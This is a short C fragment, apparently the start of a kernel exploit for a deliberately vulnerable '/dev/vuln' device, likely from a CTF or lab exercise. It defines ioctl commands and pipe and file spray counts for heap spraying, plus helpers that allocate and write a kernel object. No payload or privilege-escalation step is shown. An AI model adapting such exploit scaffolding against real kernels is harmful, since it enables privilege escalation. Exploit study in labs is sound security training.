#include "libpwn.h"
#define DEV_PATH "/dev/vuln"
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001

#define NUM_PIPE_SPRAY 0x20
#define NUM_SPRAY_FILE 0x20

int fd, pipe_fd[NUM_PIPE_SPRAY][2];

typedef struct {
  size_t size;
  char *data;
} request_t;

void obj_alloc()
{
  request_t req;
  if (ioctl(fd, CMD_ALLOC, &req) == -1) error("ALLOC failed");
  else printf("[+] Obj Alloc 0x400\n");
}

void obj_write(char *data, size_t size)
{
  request_t req = {.size = size, .data = data};
  if (ioctl(fd, CMD_WRITE, &req) == -1) error("WRITE failed");
  else printf("[+] Obj Write %d %p\n", size, data);
}